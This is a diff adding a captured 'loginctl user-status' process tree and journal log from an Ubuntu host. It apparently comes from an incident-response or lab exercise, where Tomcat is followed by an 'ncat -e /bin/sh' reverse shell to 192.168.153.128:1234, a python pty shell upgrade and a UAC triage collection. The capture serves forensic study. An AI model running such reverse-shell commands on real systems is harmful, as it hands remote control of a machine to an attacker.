@@ -1,0 +1,173 @@
+meaow (1000)
+   Since: Mon 2025-11-17 19:43:56 EET; 13min ago
+   State: active
+Sessions: *2
+  Linger: no
+    Unit: user-1000.slice
+          |-session-2.scope
+          | |-1908 "gdm-session-worker [pam/gdm-password]"
+          | |-2039 /usr/libexec/gdm-wayland-session "env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu"
+          | `-2044 /usr/libexec/gnome-session-binary --session=ubuntu
+          `-user@1000.service
+            |-app.slice
+            | |-app-gnome-at\x2dspi\x2ddbus\x2dbus-2172.scope
+            | | |-2172 /usr/libexec/at-spi-bus-launcher --launch-immediately
+            | | |-2182 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus
+            | | `-2236 /usr/libexec/at-spi2-registryd --use-gnome-session
+            | |-app-gnome-org.gnome.Evolution\x2dalarm\x2dnotify-2336.scope
+            | | `-2336 /usr/libexec/evolution-data-server/evolution-alarm-notify
+            | |-app-gnome-org.gnome.SettingsDaemon.DiskUtilityNotify-2332.scope
+            | | `-2332 /usr/libexec/gsd-disk-utility-notify
+            | |-app-gnome-update\x2dnotifier-3174.scope
+            | | `-3174 /usr/bin/update-notifier
+            | |-app-gnome\x2dsession\x2dmanager.slice
+            | | `-gnome-session-manager@ubuntu.service
+            | |   `-2131 /usr/libexec/gnome-session-binary --systemd-service --session=ubuntu
+            | |-app-org.gnome.Terminal.slice
+            | | |-gnome-terminal-server.service
+            | | | `-3132 /usr/libexec/gnome-terminal-server
+            | | `-vte-spawn-d9113f87-da02-43f1-9a6e-ed5c41a6c07e.scope
+            | |   |-  3139 bash
+            | |   |-  3318 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.90/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.90/bin/bootstrap.jar:/opt/apache-tomcat-9.0.90/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.90 -Dcatalina.home=/opt/apache-tomcat-9.0.90 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.90/temp org.apache.catalina.startup.Bootstrap start
+            | |   |-  4233 ncat -e /bin/sh 192.168.153.128 1234
+            | |   |-  4235 /bin/sh
+            | |   |-  4237 python3 -c "import pty; pty.spawn(\"/bin/bash\")"
+            | |   |-  4238 /bin/bash
+            | |   |-  6654 sudo ./uac -p ir_triage /tmp
+            | |   |-  6655 sudo ./uac -p ir_triage /tmp
+            | |   |-  6656 /bin/sh ./uac -p ir_triage /tmp
+            | |   |-177178 /bin/sh ./uac -p ir_triage /tmp
+            | |   |-177198 /bin/sh ./uac -p ir_triage /tmp
+            | |   `-177236 loginctl user-status meaow
+            | |-dconf.service
+            | | `-2636 /usr/libexec/dconf-service
+            | |-evolution-addressbook-factory.service
+            | | `-2579 /usr/libexec/evolution-addressbook-factory
+            | |-evolution-calendar-factory.service
+            | | `-2541 /usr/libexec/evolution-calendar-factory
+            | |-evolution-source-registry.service
+            | | `-2272 /usr/libexec/evolution-source-registry
+            | |-gcr-ssh-agent.service
+            | | `-2106 /usr/libexec/gcr-ssh-agent --base-dir /run/user/1000/gcr
+            | |-gnome-keyring-daemon.service
+            | | `-1959 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+            | |-gnome-session-monitor.service
+            | | `-2107 /usr/libexec/gnome-session-ctl --monitor
+            | |-snap.firefox.firefox-cffd849e-2bcd-4a09-9e2c-4c5c9524e6e8.scope
+            | | |-5309 /snap/firefox/6565/usr/lib/firefox/firefox
+            | | |-5374 /snap/firefox/6565/usr/lib/firefox/crashhelper 5309 9 /tmp/ 10 12
+            | | |-5455 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -ipcHandle 0 -signalPipe 1 -initialChannelId {4f681eb4-7129-4c96-98a4-07f6743401c2} -parentPid 5309 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 1 forkserver
+            | | |-5460 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -prefsHandle 0:34424 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {1dd212b6-ae5f-456d-9acb-90000524688e} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 2 socket"
+            | | |-5482 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:34614 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {f545c41f-5981-4355-8e67-f33223d7cdaa} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 3 tab"
+            | | |-5491 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -prefsHandle 0:34614 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {cfc6874f-7b46-49d8-981c-f9e90c00f5ed} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 4 rdd"
+            | | |-5813 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:43946 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {c7cdc56c-1c4c-47c1-b575-d19b5af06e27} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 5 tab"
+            | | |-5992 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -sandboxingKind 0 -prefsHandle 0:44909 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {45db8030-8ddb-48c3-b3b6-ecfe2bf21a8d} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 6 utility"
+            | | |-6141 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {9b2ca2ed-d55f-4925-be31-a7e707a58d38} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 7 tab"
+            | | |-6146 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {52c9b7b9-e60f-4560-b75d-3ba646155294} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 8 tab"
+            | | |-6163 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {2f75ec91-c04e-4b7d-8ece-fb74bf101d47} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 9 tab"
+            | | |-6222 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41967 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {45814dc6-12de-41d1-abcd-a766e7bdcead} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 10 tab"
+            | | `-6263 "/snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41967 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {7611c3f3-0c6e-4a43-9b3b-01bcdc639d2d} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 11 tab"
+            | |-snap.snapd-desktop-integration.snapd-desktop-integration.service
+            | | |-2841 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
+            | | `-2900 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
+            | |-xdg-desktop-portal-gnome.service
+            | | `-2720 /usr/libexec/xdg-desktop-portal-gnome
+            | `-xdg-desktop-portal-gtk.service
+            |   `-2820 /usr/libexec/xdg-desktop-portal-gtk
+            |-background.slice
+            | `-tracker-miner-fs-3.service
+            |   `-2678 /usr/libexec/tracker-miner-fs-3
+            |-init.scope
+            | |-1921 /usr/lib/systemd/systemd --user
+            | `-1928 "(sd-pam)"
+            `-session.slice
+              |-dbus.service
+              | |-1965 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+              | |-2253 /usr/libexec/gnome-shell-calendar-server
+              | |-2274 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.Shell.Notifications
+              | |-2488 /usr/libexec/ibus-portal
+              | |-2500 /usr/libexec/goa-daemon
+              | |-2530 /usr/libexec/goa-identity-service
+              | |-2701 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.ScreenSaver
+              | |-4558 /usr/bin/snap userd
+              | `-6299 /usr/bin/nautilus --gapplication-service
+              |-filter-chain.service
+              | `-1938 /usr/bin/pipewire -c filter-chain.conf
+              |-gvfs-afc-volume-monitor.service
+              | `-2549 /usr/libexec/gvfs-afc-volume-monitor
+              |-gvfs-daemon.service
+              | |-2121 /usr/libexec/gvfsd
+              | |-2129 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
+              | |-2647 /usr/libexec/gvfsd-trash --spawner :1.20 /org/gtk/gvfs/exec_spaw/0
+              | `-6320 /usr/libexec/gvfsd-recent --spawner :1.20 /org/gtk/gvfs/exec_spaw/1
+              |-gvfs-goa-volume-monitor.service
+              | `-2531 /usr/libexec/gvfs-goa-volume-monitor
+              |-gvfs-gphoto2-volume-monitor.service
+              | `-2557 /usr/libexec/gvfs-gphoto2-volume-monitor
+              |-gvfs-metadata.service
+              | `-2646 /usr/libexec/gvfsd-metadata
+              |-gvfs-mtp-volume-monitor.service
+              | `-2563 /usr/libexec/gvfs-mtp-volume-monitor
+              |-gvfs-udisks2-volume-monitor.service
+              | `-2439 /usr/libexec/gvfs-udisks2-volume-monitor
+              |-org.freedesktop.IBus.session.GNOME.service
+              | |-2288 /usr/bin/ibus-daemon --panel disable
+              | |-2468 /usr/libexec/ibus-memconf
+              | |-2476 /usr/libexec/ibus-extension-gtk3
+              | `-2615 /usr/libexec/ibus-engine-simple
+              |-org.gnome.SettingsDaemon.A11ySettings.service
+              | `-2289 /usr/libexec/gsd-a11y-settings
+              |-org.gnome.SettingsDaemon.Color.service
+              | `-2292 /usr/libexec/gsd-color
+              |-org.gnome.SettingsDaemon.Datetime.service
+              | `-2296 /usr/libexec/gsd-datetime
+              |-org.gnome.SettingsDaemon.Housekeeping.service
+              | `-2300 /usr/libexec/gsd-housekeeping
+              |-org.gnome.SettingsDaemon.Keyboard.service
+              | `-2301 /usr/libexec/gsd-keyboard
+              |-org.gnome.SettingsDaemon.MediaKeys.service
+              | `-2308 /usr/libexec/gsd-media-keys
+              |-org.gnome.SettingsDaemon.Power.service
+              | `-2309 /usr/libexec/gsd-power
+              |-org.gnome.SettingsDaemon.PrintNotifications.service
+              | |-2311 /usr/libexec/gsd-print-notifications
+              | `-2516 /usr/libexec/gsd-printer
+              |-org.gnome.SettingsDaemon.Rfkill.service
+              | `-2312 /usr/libexec/gsd-rfkill
+              |-org.gnome.SettingsDaemon.ScreensaverProxy.service
+              | `-2313 /usr/libexec/gsd-screensaver-proxy
+              |-org.gnome.SettingsDaemon.Sharing.service
+              | `-2316 /usr/libexec/gsd-sharing
+              |-org.gnome.SettingsDaemon.Smartcard.service
+              | `-2319 /usr/libexec/gsd-smartcard
+              |-org.gnome.SettingsDaemon.Sound.service
+              | `-2320 /usr/libexec/gsd-sound
+              |-org.gnome.SettingsDaemon.Wacom.service
+              | `-2330 /usr/libexec/gsd-wacom
+              |-org.gnome.Shell@wayland.service
+              | |-2169 /usr/bin/gnome-shell
+              | `-2780 gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P /usr/share/gnome-shell/extensions/ding@rastersoft.com/app
+              |-pipewire-pulse.service
+              | `-1951 /usr/bin/pipewire-pulse
+              |-pipewire.service
+              | `-1937 /usr/bin/pipewire
+              |-wireplumber.service
+              | `-1945 /usr/bin/wireplumber
+              |-xdg-desktop-portal.service
+              | `-2715 /usr/libexec/xdg-desktop-portal
+              |-xdg-document-portal.service
+              | |-2005 /usr/libexec/xdg-document-portal
+              | `-2016 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+              `-xdg-permission-store.service
+                `-2009 /usr/libexec/xdg-permission-store
+
+Nov 17 19:52:42 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:52:57 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:52:57 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:52:57 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:52:57 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:52:57 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:53:53 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:53:53 meaow org.freedesktop.FileManager1[6299]: context mismatch in svga_surface_destroy
+Nov 17 19:55:37 meaow sudo[6654]:    meaow : TTY=pts/0 ; PWD=/home/meaow/Downloads/uac-main ; USER=root ; COMMAND=./uac -p ir_triage /tmp
+Nov 17 19:55:37 meaow sudo[6654]: pam_unix(sudo:session): session opened for user root(uid=0) by meaow(uid=1000)
